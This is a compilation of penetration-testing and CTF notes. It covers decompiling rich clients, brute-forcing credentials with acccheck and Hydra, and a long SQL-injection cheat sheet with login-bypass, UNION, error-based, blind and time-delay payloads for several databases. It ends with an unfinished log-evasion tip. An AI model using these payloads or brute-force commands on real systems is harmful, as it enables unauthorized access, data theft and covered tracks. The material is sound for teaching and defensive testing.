Flash Tools Flash bytecode can be decompiled into ActionScript source code. An alternative approach, which is often more effective, is to disassemble the bytecode into a human-readable form, without actually fully decompiling it into source code. To decompile and disassemble Flash, you can use the following tools: n Flasm — www.nowrap.de/flasm n Flare — www.nowrap.de/flare n SWFScan — www.hp.com/go/swfscan (this works for Actionscript 2 and 3)
Silverlight Tools Silverlight bytecode can be decompiled into source code using a tool called .NET Reﬂ ector, which is available from:
www.red-gate.com/products/dotnet-development/reflector/


Working on the Source Code 

 The ﬁ rst step generally is to review the source code to understand how the component works and what functionality it contains or references. Here are some items to look for: n Input validation or other security-relevant logic and events that occur on the client side n Obfuscation or encryption routines being used to wrap user-supplied data before it is sent to the server n “Hidden” client-side functionality that is not visible in your user interface but that you might be able to unlock by modifying the component n References to server-side functionality that you have not previously identiﬁed via application mapping


Recompiling

To perform the recompilation, you need to use the developer tools that are relevant to the technology you are using: n For Java, use the javac program in the JDK to recompile your modiﬁ ed source code. n For Flash, you can use flasm to reassemble your modiﬁ ed bytecode or one of the Flash development studios from Adobe to recompile modiﬁ ed ActionScript source code. n For Silverlight, use Visual Studio to recompile your modiﬁ ed source code.


Attaching a Debugger

 JavaSnoop, a Java debugger that can integrate Jad to decompile source code, trace variables through an application, and set breakpoints on methods to view and modify parameters

 lternative tool for debugging Java is JSwat, which is highly conﬁ gurable


Attacking Authentication
=========================

Authentication Technologies
---------------------------

A wide range of technologies are available to web application developers when implementing authentication mechanisms: 

* HTML forms-based authentication 
* Multifactor mechanisms, such as those combining passwords and physical tokens 
* Client SSL certiﬁcates and/or smartcards 
* HTTP basic and digest authentication 
* Windows-integrated authentication using NTLM or Kerberos 
* Authentication services 
  
By far the most common authentication mechanism employed by web applications uses HTML forms to capture a username and password and submit these to the application


Design Flaws in Authentication Mechanisms
-----------------------------------------

Bad Passwords Many web applications employ no or minimal controls over the quality of users’ passwords. It is common to encounter applications that allow passwords that are: 

* Very short or blank 
* Common dictionary words or names 
* The same as the username 
* Still set to a default value

HACK STEPS

Attempt to discover any rules regarding password quality: 

1. Review the website for any description of the rules. 
2. If self-registration is possible, attempt to register several accounts with different kinds of weak passwords to discover what rules are in place. 
3. If you control a single account and password change is possible, attempt to change your password to various weak values.

This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF’s.

* You may want to use your browser to view the source of the web page (Right click View Source or Cntrl + U . Sometimes, important information is hidden using comments.

* If there are some files/ directories like http://example.org/files/pixel.png, probably http://example.org/files/ might be a directory listing containing some information. Also, always good to check robots.txt file

* Cookies plays a important part in remembering the state. For example: loggedin=0 means you are not logged in and just changing that to loggedin=1 gives you the access.

* It may be helpful to learn how to 'Inspect Elements' in your browser. It helps you to distinguish each element which might be or not be hidden.

* Some symbols need to be URL Encoded when included in GET requests. 

  Reserved characters after percent-encoding

  .. code-block :: bash 

    !	#	$	&	'	(	)	*	+	,	/	:	;	=	?	@	[	]
    %21	%23	%24	%26	%27	%28	%29	%2A	%2B	%2C	%2F	%3A	%3B	%3D	%3F	%40	%5B	%5D

  Common characters after percent-encoding (ASCII or UTF-8 based)

  .. code-block :: bash 

      newline	                space	"	%	-	.	<	>	\	^	_	`	{	|	}	~
      %0A or %0D or %0D%0A	%20	%22	%25	%2D	%2E	%3C	%3E	%5C	%5E	%5F	%60	%7B	%7C	%7D	%7E

* In some web exploitation challenges, if the secret is stored on the client side and there are some javascript involved, you could possibly find the answer in the Javascript console, Browser Developer Tools. (F12 Key).

* Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.

* If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as  admin'   or 1=1 limit 1;#

 .. code-block :: bash 
   $username = $_POST["username"];
   $password = $_POST["password"];
   $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
   $result = mysqli_query($con, $query);

   if (mysqli_num_rows($result) !== 1) {
      echo "<h1>Login failed.</h1>";
      } else {
      echo "<h1>Logged in!</h1>";
      echo "<p>Your flag is: $FLAG</p>";
   }

* If the Login prompt contains SQL query and checks only one result, plus have extra checks (see example below), then we can create a fake row  SQL whose value we control.

  .. code-block :: bash 

    $con = mysqli_connect("localhost", "sql2", "sql2", "sql2");
    $username = $_POST["username"];
    $password = $_POST["password"];
    $query = "SELECT * FROM users WHERE username='$username'";
    $result = mysqli_query($con, $query);

    $logged_in = false;
    if (mysqli_num_rows($result) === 1) {
  	$row = mysqli_fetch_array($result);
  	if ($row["password"] === $password) {
        	$logged_in = true;
    		echo "<h1>Logged in!</h1>";
    		echo "<pre>User level: ", $row["user_level"],  "</pre>";
    		if ($row["user_level"] >= 1337) {
      			echo "<p>Your flag is: $FLAG</p>";
    			} else {
      		  echo "<p>Only user levels 1337 or above can see the flag.</p>";
    			}
  		}
	  }

   You have to create a fake query such as

 .. code-block :: bash 

   random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level --
   where  
   The ' closes the username string and 1=0 will always return false, invalidating the first half.
   The union all statement allows us to concatenate two SQL select queries, so we append UNION ALL and then our fake select statement.

		
 Don't forget to enter the same password in the password field :P

* Perl Script running on a webpage, read `Security Issues in Perl Scripts <http://www.cgisecurity.com/lib/sips.html>`_.

* In some web exploitation excercises, you can modify the GET/POST request in the burpsuite to get the flag.

PHP
===

passthru
--------

passthru — Execute an external program and display raw output

The passthru() function is similar to the exec() function in that it executes a command. This function should be used in place of exec() or system() when the output from the Unix command is binary data which needs to be passed directly back to the browser. 

Warning
When allowing user-supplied data to be passed to this function, use escapeshellarg() or escapeshellcmd() to ensure that users cannot trick the system into executing arbitrary commands.



Acccheck
--------

Unlike the smbmap and crackmapexec, acccheck can only be used for validating the credentials gathered.

::

  acccheck v0.2.1 - By Faiz

  Description:
  Attempts to connect to the IPC$ and ADMIN$ shares depending on which flags have been
  chosen, and tries a combination of usernames and passwords in the hope to identify
  the password to a given account via a dictionary password guessing attack.

  Usage = ./acccheck [optional]

   -t [single host IP address]
   OR 
   -T [file containing target ip address(es)]

  Optional:
   -p [single password]
   -P [file containing passwords]
   -u [single user]
   -U [file containing usernames]
   -v [verbose mode]

usage
-----

::

  acccheck -t 10.7.3.17 -u backup4idc -p bckp@123 

        SUCCESS.... connected to 192.168.4.32 with username:'Administrat0r' and password:'P@ssw0rd!'

End of Scan

Here, we can give a list of hosts in a text file format as well by specifying the '-T' flag.

Hydra
-----

Hydra is powerful command line tool which can be used for brute-forcing several services such as smb, HTTP, RSH, ssh etc. It can also be used for validating the credentials.

Usage
-----

::

  Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

  Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-ISOuvVd46] 
  [service://server    [:PORT][/OPT]]

  Options:
    -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
    -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
    -C FILE   colon separated "login:pass" format, instead of -L/-P options
    -M FILE   list of servers to attack, one entry per line, ':' to specify port
    -t TASKS  run TASKS number of connects in parallel per target (default: 16)
    -U        service module usage details
    -h        more command line options (COMPLETE HELP)
    server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
    service   the service to crack (see below for supported protocols)
    OPT       some service modules support additional input (-U for module help)

Example
-------

::

  hydra -l Administrat0r -p P@ssw0rd! -M hosts1.txt service smb  


Appendix-VII SQL-Injection
==========================

This section is mainly combined from multiple sources mainly `Graceful Security : SQL Injection Series <https://www.gracefulsecurity.com/sql-injection-exploitation/>`_, `NetSparker SQL Injection Cheat Sheet <https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/>`_,
`Everything you wanted to know about SQL injection (but were afraid to ask) <https://www.troyhunt.com/everything-you-wanted-to-know-about-sql/>`_ and `Websec Sql Injection <https://websec.ca/kb/sql_injection>`_

Structured Query Language (SQL) is potentially vulnerable to an injection attack any time if a user input is insecurely concatenated into a query. An injection attack allows an attacker to alter the logic of the query and the attack may lead to confidential data theft, website defacement, malware propagation and host or network compromise.

Introduction
------------

Different types of queries are

* SELECT : used for retrieving data from the database
* INSERT : adding new rows to a table 
* UPDATE : taking a table row and modifying it
* DELETE : removing rows from a table
* Stored Procedures : MSSQL procedures xp_cmdshell which can be used for executing commands on the remote database host.

SELECT statements retrieve data from the database and look like:

::

 SELECT column FROM table WHERE condition is true

For example the following could be used for a login system:

::

 SELECT username,password FROM users WHERE username='$INPUT1$' AND password='$INPUT2$';

Where $INPUT1$ and $INPUT2$ is text taken from the user of the application. 

Developers can add comments into a statement by preceding the comment with a 

::

  "--"
 
before the comment, which makes the SQL parser ignore any following text. Taking this into account an attacker could utilize the following payload for INPUT1 to cause a login bypass: 

::

 x’ OR 1=1 --

This input would change the command to the following:

::

 SELECT username,password FROM users WHERE username='x' OR 1=1 -- ' AND password='$INPUT2$';

The double dash has caused the password check to be “commented out” so that it has no effect. Attacker has altered the intended logic of the statement and they could use this to bypass authentication, cause the database to leak confidential information or even execute functions such as executing operating system commands.

Detecting Vulnerable Functions
------------------------------

A effective way to do detect vulnerable functions is to alter the query in such a way that we have successfully injected into SQL and possibly see a visible result. e.g. SQL-like syntax being parsed in the expected way.

Consider the following query which loads a news article from the database to display on an fictitious web application:

::

 SELECT id,title,content FROM tblArticles WHERE id=$input

which is accessed through the following URL:

::

 http://sql.example.org/news?id=100

Now a simple way to determine is the parameter “id” is vulnerable to injection would be would be to try the following URLs and see how the server reacts:

::

 http://sql.example.org/news?id=100
 http://sql.example.org/news?id=101
 http://sql.example.org/news?id=101-1

* If the server is appropriately vulnerable it would be expected that the first and second URL show different articles whereas the third one is evaluated by the database and produces the same output as the first URL. 
* If the statement 101-1 is not evaluated then there’ll be a notable change in output. 
  
The above example, obviously, will only work on integer inputs, if the id parameter was instead a string input like this:

::

 http://sql.example.org/news?page=example

With the above case it’s possible to utilize string concatenation in a similar way, where if the string is evaluated and concatenated then the output should not change whereas if it is no evaluated then a noticeable change in output will occur. The method of concatenation differs between back-end database types however if one works you have the added benefit of fingerprinting the database type!

MSSQL

::

 exa'+'mple
 With URLs a + is space, use %2b instead (URI encoded plus sign)! 

MySQL

::

  exa' 'mple (that's a space between two apostrophes)

Oracle

::

 exa'||'mple


An additional way of detecting of detecting functions that are vulnerable is to concatenate a simple conditional at the end of the input, such as:

::

 AND 1=1 -- 
 AND 1=2 -- 

The idea with these payloads is that 

* the top option of 1=1 will not alter the logic of the query in anyway (as 1 does in fact equal 1) although 
* the second payload will break the query and therefore the application would operate in a noticeably different way, such as missing text on the page (and therefore a shorter content length), a faster response time, a visible error or a different status code. 
  
The application should also have the same effect regardless of what the conditional was, so 1=1, 2=2 and 3=3 should all have the same effect, as should payloads such as:

::

 AND (SELECT @@version)=(SELECT @@version) --

The above payload is useful because its very SQL-like and whilst there may be some application logic which interprets 1=1 it’s very unlikely that outside of a SQL injection context you’ll get the same response from the above payload. It’s important to note however, that this payload is vendor specific, so the above will work on MSSQL and MySQL but not PostgreSQL. There’s a suitable payload for each of the backends however. The PostgreSQL equivalent would be:

::

 AND (SELECT version())=(SELECT version()) --

Bypassing Login Screens (SMO+)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

**SQL Injection 101, Login tricks**

::

 admin' --
 admin' #
 admin'/*
 ' or 1=1--
 ' or 1=1#
 ' or 1=1/*
 ') or '1'='1--
 ') or ('1'='1--


**Login as different user (SM)**

::

 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
 *Old versions of MySQL doesn't support union queries

**Bypassing second MD5 hash check login screens**

If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

Bypassing MD5 Hash Check Example (MSP)

::

 Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 Password : 1234
 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)


Types of Injection
------------------

Error Based
^^^^^^^^^^^

Error-based SQL injection comes about when errors from the SQL database are exposed to the attacker by being embedded in application responses. 

Detection is generally as simple as placing an apostrophe in the parameter an you’d receive an error along the lines of:

::

 Microsoft SQL Native Client error ‘80040e14’
 Unclosed quotation mark after the character string

The exact error depends on the backend database. These errors can be controlled and by crafting input you can cause the error to contain data from the database itself. For example, if you are injecting into an integer input you can cause a type clash which will disclose information like this:

::

 AND 1 in (SELECT @@version)

with input like this you’ll get an error along the following lines:

::

 Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2008 R2 (SP1) - 10.50.2500.0 (X64) Jun 17 2011 00:54:03 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor)' to data type int.

This works as the database attempts to convert the string to an integer, cannot, and throws an error that reveals the information.

Example:

Let's say there's a website with

::

 http://widgetshop.com/widget/?id=1 

and we try with 

::

 http://widgetshop.com/widget/?id=1 or x=1

and it gives us an error 

::

 Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'x'

We can possibly extract table names and other details with this

::

  http://widgetshop.com/widget/?id=convert(int,(select top 1 name from sysobjects where id=(select top 1 id from (select top 1 id from sysobjects where xtype='u' order by id) sq order by id DESC)))

we get the error

::

 System.Data.SqlClient.SqlException: Conversion failed when converting the varchar value "TableName" to data type int.


Let’s deconstruct the query from the URL:

::

 convert(int, (
    select top 1 name from sysobjects where id=(
      select top 1 id from (
        select top 1 id from sysobjects where xtype='u' order by id
      ) sq order by id DESC
    )
   )
  )

* Working from the deepest nesting up, get the first record ID from the sysobjects table after ordering by ID. 
* From that collection, get the last ID (this is why it orders in descending) and pass that into the top select statement. 
* That top statement is then only going to take the table name and try to convert it to an integer. 
* The conversion to integer will almost certainly fail (please people, don’t name your tables “1” or “2” or any other integer for that matter!) and that exception then discloses the table name in the UI.

Union Based
^^^^^^^^^^^
The UNION operator allows two or more SELECT statements to be combined, the idea being that a developer may run a query such as listing all of the products available in a store and an attacker can combine this with an additional query, such as listing all of the usernames and passwords in the customers table.
To utilise a union though the attacker must request the same number (and type) as the original query and therefore needs to know how many columns are being used. There are two ways to do this, the first is 

* to use NULLs in place of the columns to determine how many columns there are, such as:

 ::

  UNION SELECT NULL -- 
  UNION SELECT NULL, NULL -- 
  UNION SELECT NULL, NULL, NULL -- 
  UNION SELECT NULL, NULL, NULL, NULL -- 
  UNION SELECT NULL, NULL, NULL, NULL, NULL -- 
  UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL -- 
  UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --

 and continue until you’ve determined how many columns there are – if you get the incorrect number of columns an error condition will occur and if you get the right number then the application will run unhindered. You can then swap out the NULL with datatypes to determine which ones are correct, such as:

 ::

  UNION SELECT 'abcd', NULL, NULL, NULL -- 
  UNION SELECT 1, NULL, NULL, NULL --

 Work them out one at a time until you end up with something like this:

 ::

  UNION SELECT 1, 'string', 'string', 'string' --

 At this point you have a working SELECT statement where the output will be appended to the normal output the application gives! 

 If you’ve got a lot of columns and writing out all of those NULLs is too much like hard work there’s 
 
* another method of doing the original column count enumeration, using ORDER BYs. If you attempt to order by a column number which is higher than the number of columns it’ll throw an error. So you can start low and work up until you see an error:

 ::

  ORDER BY 1 -- 
  ORDER BY 2 -- 
  ORDER BY 3 -- 
  ORDER BY 4 -

**Hints**

* Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.
* To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.
* Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc. 
  * Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)


**Finding Column Type**

* ::
  
   ' union select sum(columntofind) from users-- (S) 
   Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
   [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument. 

 If you are not getting an error it means column is numeric.

* Also you can use CAST() or CONVERT() 

  ::

   SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--

* Other
  
  ::
  
   11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-    - No Error - Syntax is right. MS SQL Server Used. Proceeding.
   11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-       - No Error – First column is an integer.
   11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --          - Error!   – Second column is not an integer.
   11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-        - No Error – Second column is a string.
   11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-           - Error!   – Third column is not an integer. ... 

* Other2

 ::

  Microsoft OLE DB Provider for SQL Server error '80040e07' 
  Explicit conversion from data type int to image is not allowed.

 We'll get convert() errors before union target errors ! So start with convert() then union


Blind SQL Injections
^^^^^^^^^^^^^^^^^^^^^

About Blind SQL Injections

In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.

* Normal Blind, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code 
* Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.

In normal blinds you can use if statements or abuse WHERE query in injection (generally easier), in totally blinds you need to use some waiting functions and analyze response times. For this you can use WAIT FOR DELAY '0:0:10' in SQL Server, BENCHMARK() and sleep(10) in MySQL, pg_sleep(10) in PostgreSQL, and some PL/SQL tricks in ORACLE

Blind Boolean
^^^^^^^^^^^^^
If the application gracefully errors, and it’s not possible to combine queries with UNION, then an attacker can use inference to determine the answer to queries about the database. The payloads we used earlier to prove the existence of injection are simple examples of this:

::

 AND 1=1 -- 
 AND 1=2 --

Essentially these are asking yes or no questions of the database and the result shows the answer.

* "Does 1=1"? Yes of course it does and therefore the normal output of the application will be visible. 
* “Does 1=2"? No it does not and therefore there should be a noticeable chance, this could be in the response length, time of execution, or HTTP response code.

However we can expand up on this idea to ask more in-depth questions of the database, as long as we can phrase them as Yes/ No questions. For example, “Is the first letter of the current user the letter ‘a'”? That’d look something like:

::

  AND SUBSTR(SELECT user_name(), 1, 1)='a' --
  
We can cycle through: b, c, d, e until we get a “true” response – then move on to the second character and so on. A time consuming and request intensive process but it can be automated quite easily with python (or Burp Intruder!)

The above check of 

::

 AND 1=1 -- 

can also be made by using

::

 id = 5 'or 1 = (select db_name ()) - => The name of the Database of the current user. 
 id = 5 'or 1 = (select system_user) - => The name of the owner of the given database. 
 id = 5 'and len (@@ version) = len (@@ version) - => true 
 id = 5 'and (@@ TEXTSIZE> @@ LANGID) - => true

For Example:

::

 http://bounty/yadayada.asp?id=8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 --> page will be loaded normally.
 http://bounty/yadayada.asp?id=8888'+AND+(@@LANGID>@@TEXTSIZE)+'1'+LIKE+'1 --> page will be blank

What we are trying to do is run a existing Transact-SQL inside a MSSQL where its return types is either integer or smallint. And usually, these return types already have their own value.

Such as an example:

::

 @@LANGID usually will be 0 for default (English language)
 @@TEXTSIZE can be bigger than 1000

**If Statements**

Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly and accurately. If statements of

MySQL

::

 IF(condition,true-part,false-part) (M) 
 SELECT IF(1=1,'true','false')

SQL Server

::

 IF condition true-part ELSE false-part (S) 
 IF (1=1) SELECT 'true' ELSE SELECT 'false'

Oracle

::

 BEGIN
 IF condition THEN true-part; ELSE false-part; END IF; END; (O) 
 IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;

PostgreSQL

::

 SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P) 
 SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;

If Statement SQL Injection Attack Samples

::

 if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S) 

This will throw an divide by zero error if current logged user is not "sa" or "dbo"

Examples:

These tests are simply good for blind sql injection and silent attacks.

* product.asp?id=4 (SMO) 

  ::
  
    product.asp?id=5-1
    product.asp?id=4 OR 1=1 

* product.asp?name=Book 
  
  ::

   product.asp?name=Bo'%2b'ok
   product.asp?name=Bo' || 'ok (OM)
   product.asp?name=Book' OR 'x'='x


Example:

::

 http://widgetshop.com/widget/?id=1 and 1=2

Firstly, it might just throw an exception if no record is returned. Secondly, the app might not throw an exception but then it also won’t display a record either because the equivalency is false.

Now let’s try

::

 1 and
 (
  select top 1 substring(name, 1, 1) from sysobjects where id=(
      select top 1 id from (
            select top 1 id from sysobjects where xtype='u' order by id
        ) sq order by id desc
       )
  ) = 'a'


It’s now an equivalency test to see if the first character of the table name is an “a” (we’re assuming a case-insensitive collation here). If this request gives us the same result as “?id=1” then it confirms that the 
first table in sysobjects does indeed begin with an “a” as the equivalency has held true. If it gives us one of the earlier mentioned two scenarios (an error or shows no record), then we know that the table doesn’t begin 
with an “a” as no record has been returned.

Now all of that only gives us the first character of the table name from sysobjects, when you want the second character then the substring statement needs to progress to the next position:

::

 select top 1 substring(name, 2, 1) from sysobjects where id=(

We can see it now starts at position 2 rather than position 1. Of course this is laborious; as well as enumerating through all the tables in sysobjects you end up enumerating through all the possible letters of the alphabet 
until you get a hit then you have to repeat the process for each character of the table name.

A better way to this would be:

::

 1 and
 (
  select top 1 ascii(lower(substring(name, 1, 1))) from sysobjects where id=(
      select top 1 id from (
            select top 1 id from sysobjects where xtype='u' order by id
      ) sq order by id desc
    )
  ) > 109

Difference here in that what’s it doing is rather than checking for an individual character match, it’s looking for where that character falls in the ASCII table. Actually, it’s first lowercasing the table name to 
ensure we’re only dealing with 26 characters (assuming alpha-only naming, of course), then it’s taking the ASCII value of that character. In the example above, it then checks to see if the character is further down the table 
than the letter “m” (ASCII 109) and then of course the same potential outcomes as described earlier apply (either a record comes back or it doesn’t). 

The main difference is that rather than potentially making 26 attempts at guessing the character (and consequently making 26 HTTP requests), it’s now going to exhaust all possibilities in only 5 – you just keep halving the 
possible ASCII character range until there’s only one possibility remaining.

For example, if greater than 109 then it must be between “n” and “z” so you split that (roughly) in half and go greater than 115. If that’s false then it must be between “n” and “s” so you split that bang in half and go greater 
than 112. That’s true so there’s only three chars left which you can narrow down to one in a max of two guesses. Bottom line is that the max of 26 guesses (call it average of 13) is now done in only 5 as you simply just keep 
halving the result set.

Another example from `Exploiting (pretty) blind SQL injections <https://isc.sans.edu/diary/Exploiting+%28pretty%29+blind+SQL+injections/20733>`_

SQL query through a request:

::

 http://10.10.10.10/application.aspx?queueID=743994

When the URL was opened regularly, in a browser, it was supposed to list certain transactions belonging to the numerical queueID in shown in the URL. The first issue was that the queueID we had to work with had no results! 
It just returned an empty page (and there was no Direct Object Reference here, we had to use that particular queueID).

Putting 743994 OR 1=1 or a UNION didn’t work either – the application expected exactly certain values in the columns (not only column types) and all we could get with both of these cases was a nice, generic error screen.

So, to prove that there was a SQL injection vulnerability, the following two queries can satisfy our needs:

::

 queueID = 743994 AND 1=1
 queueID = 743994 AND 1=2
 queueID = 743995
 queueID = 743994’

The first 3 queries all return a no results page. The last one returns the generic error page due to the SQL error that happened in the background. As with any blind SQL injection vulnerability, we need a true/false cases. 
The true case can be the no results page, while the false case can be the error page. The only question that remains is how to provoke the error page – it’s easy to do manually by entering a ‘ character, but how to do it in SQL, programmatically?
Division by zero come to the rescue! If we divide something by zero, we can cause an SQL error, which will result with the generic error page.

Our exploitation now becomes the following:

::

 queueID = 743994 AND 1 = 1 / (select case when substr(banner, 1, 1) = 'A' then 1 else 0 end from (select banner from v$version where banner like '%Oracle%'))

The query takes the database banner from v$version (where it has string Oracle in it). Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'. If it is 'A', the query returns 1, otherwise it returns 0. 
This will either result in 1 = 1 / 1 or 1 = 1 / 0. The former will display the no results page while the latter will display the error page.


Another example from `Advanced Blind SQL Injection - Oracle <https://isc.sans.edu/diary/Advanced+blind+SQL+injection+%28with+Oracle+examples%29/6409>`_

**Environment**

In our test environment, the developer receives one parameter. We'll call it event and it can have two possible values, true or false. When called, it is used like this:

::

 http://10.10.10.10/application.php?event=true 
 or
 http://10.10.10.10/application.php?event=false

However, depending on the parameter (true or false or something else), the application will have different output and that allows us to see what's going on behind. In other words, if the parameter is "true" the output will be 
different from the case when the parameter is "abcd" (or "false"). And this is the basis of blind SQL injection – we want to make a difference between various SQL statements which will allow us to deduce the content of the database.

In typical blind SQL injection examples a timed delay is added to the attacker observes how long it takes for the query to execute. In this case it was not possible because we were dealing with stored procedures and some web 
application firewalls which prevented from using UNION statements.

**Exploitation**

As we don't know how exactly the stored procedure is called or what's the backend database, the easiest way to determine that is to split the input parameter:

::

 event = tr' || 'ue

This will cause the final input parameter to be 'tr' || 'ue' – the || operator in Oracle means concatenate so the parameter will actually be "true".

This shows that the database is evaluating the SQL statement which allows us to enter some if/then cases that will, in the end, allow us to read data from the database. So let's see how this is done in a bit more complex query:

::

 event = tr' || (select case when substr(banner, 1, 1) = 'A' then 'u' else 'X' end from (select banner from v$version where banner like '%Oracle%')) || 'e

* The query takes the database banner from v$version (where it has string Oracle in it). 
* Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'.
* If it is 'A', the query returns 'u', otherwise it returns 'X'.
* Finally, this is concatenated so we have the following if/then case:
 * If first character of the banner line containing string Oracle is 'A' return 'u' so the final string will be 'true'.
 * Otherwise, return 'X' so the final string will be 'trXe'.
    
Now, by examining the output of the application, it is possible to deduce if the query was successful or not. 

Oracle has a handy table called all_sources which contains sources of stored procedures and functions. This may allow to retrieve source code!

SubstringToCharacterConversionToIncrementationOrDecrementationToCharacterConversionToStringConcatenation!!!!!!!


This might be useful in some scenarios 

::
 
 SUBSTRING(<thing>,X,1)

and then convert that to its numeric ASCII value:

::

 ASCII( SUBSTRING(<thing>,X,1) )

and then either increment or decrement that numeric value to the ASCII value of a character to get a result from:

::

 ASCII( SUBSTRING(<thing>,X,1) ) +/- Y

and then take that numeric ASCII value and convert THAT back to a character:

::

 CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y )

and then perform string concatenation on that entire thing:

::

 "We' + CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y ) + 'dy"

and then see if I get "Wendy" back as search result or nothing at all.

Time-Based Blind
^^^^^^^^^^^^^^^^

If the application does not embed responses so you can’t use UNION, if it doesn’t show error messages an it’s not possible to determine the output of a boolean then there is still hope! If you can’t infer the output to a boolean through application responses you can add a notable difference yourself through time delays.

Effectively using IF statements and delays you can ask the application “Does A=A? If so, please delay your response by five seconds and if not then immediately respond”. Then by detecting lag in the response you’ll get your answer! Simple…but very time consuming…
A payload like this will work for MSSQL:

::

 IF('a'='a') WAITFOR DELAY '0:0:5' --

Then you can simply replace the ‘a’=’a’ with whatever yes/no question it was that you’d like to ask.

**WAIT FOR DELAY 'time' (S)**

This is just like sleep, wait for specified time. CPU safe way to make database wait.

::

 WAITFOR DELAY '0:0:10'--

Also, you can use fractions like this,

::

 WAITFOR DELAY '0:0:0.51'

Real World Samples

::

 Are we 'sa' ? 
 if (select user) = 'sa' waitfor delay '0:0:10'

ProductID

::

  ProductID = 1;waitfor delay '0:0:10'--
  ProductID =1);waitfor delay '0:0:10'--
  ProductID =1';waitfor delay '0:0:10'--
  ProductID =1');waitfor delay '0:0:10'--
  ProductID =1));waitfor delay '0:0:10'--
  ProductID =1'));waitfor delay '0:0:10'--

BENCHMARK() (M)

Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!

::

 BENCHMARK(howmanytimes, do this)

Real World Samples

::

 Are we root ? woot! 
 IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))
 Check Table exist in MySQL 
 IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))

* pg_sleep(seconds) (P) : Sleep for supplied seconds.

  ::

   SELECT pg_sleep(10); Sleep 10 seconds.

* sleep(seconds) (M) : Sleep for supplied seconds.

  ::

    SELECT sleep(10); Sleep 10 seconds.

* dbms_pipe.receive_message (O) : Sleep for supplied seconds.

  ::

   (SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
   {INJECTION} = You want to run the query.
  
  If the condition is true, will response after 10 seconds. If is false, will be delayed for one second.


Example:

Let's say the query is

::

 http://widgetshop.com/Widgets/?OrderBy=Name

which would be 

::

 SELECT * FROM Widget ORDER BY Name

If stacked queries are enabled, may we can do 

::

 Name;
 IF(EXISTS(
   select top 1 * from sysobjects where id=(
     select top 1 id from (
       select top 1 id from sysobjects where xtype='u' order by id
     ) sq order by id desc
   ) and ascii(lower(substring(name, 1, 1))) > 109
  )) 
  WAITFOR DELAY '0:0:5'

Statement that looks for the presence of a table at the end of sysobjects beginning with a letter greater than “m” and if it exists, the query then takes a little nap for 5 seconds.

Covering Your Tracks
---------------------

SQL Server -sp_password log bypass (S)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

SQL Server don't log queries that includes sp_password for security reasons(!). So if you add 

::

 --sp_password 

